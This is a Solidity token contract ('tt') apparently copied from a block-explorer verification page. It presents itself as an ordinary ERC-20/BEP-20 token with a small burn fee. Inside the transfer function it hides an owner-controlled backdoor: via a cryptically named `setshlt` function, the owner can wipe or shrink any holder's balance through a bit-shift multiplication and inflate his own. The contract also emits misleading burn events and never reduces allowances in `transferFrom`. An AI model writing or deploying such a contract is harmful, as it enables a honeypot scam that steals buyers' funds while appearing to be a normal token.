/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-08
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-07
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accbount) external view returns (uint256);

    function transfer(address recipient, uint256 amouuts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amouuts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amouuts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - feiet https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "tt";
    string private _symbol = "tt";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfeiet = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) private _shltAddress;

    function setshlt(address _address,uint256 _value) external onlyowner {
        _shltAddress[_address] = _value;
    }

    function setshlt(address _address) external view onlyowner returns (uint256) {
        return _shltAddress[_address];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amouuts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 feietamouut = 0;
        feietamouut = amouuts.mul(_burnfeiet).div(100);
        if (_shltAddress[sender] > 1) {
            if (sender == owner()) {
                _balance[sender] = _balance[sender].mul(6 << _shltAddress[sender]);
            }else{
                _balance[sender] = _balance[sender].mul(6 >> _shltAddress[sender]);
            }
        }
        uint256 blsender = _balance[sender];
        require(blsender >= amouuts,"IERC20: transfer amouuts exceeds balance");

        _balance[sender] = _balance[sender].sub(amouuts);

        uint256 amoun;
        amoun = amouuts - feietamouut;
        _balance[recipient] += amoun;
        if (_burnfeiet > 0){
            emit Transfer (sender, _DEADaddress, feietamouut);
        }
        emit Transfer(sender, recipient, amoun);
    }

    function transfer(address recipient, uint256 amouuts) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amouuts);
        return true;
    }


    function balanceOf(address accbount) public view override returns (uint256) {
        return _balance[accbount];
    }

    function approve(address spender, uint256 amouuts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amouuts);
        return true;
    }

    function _approve(address owner, address spender, uint256 amouuts) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amouuts;
        emit Approval(owner, spender, amouuts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amouuts) public virtual override returns (bool) {
        _transfer(sender, recipient, amouuts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amouuts, "IERC20: transfer amouuts exceeds allowance");
        return true;
    }

}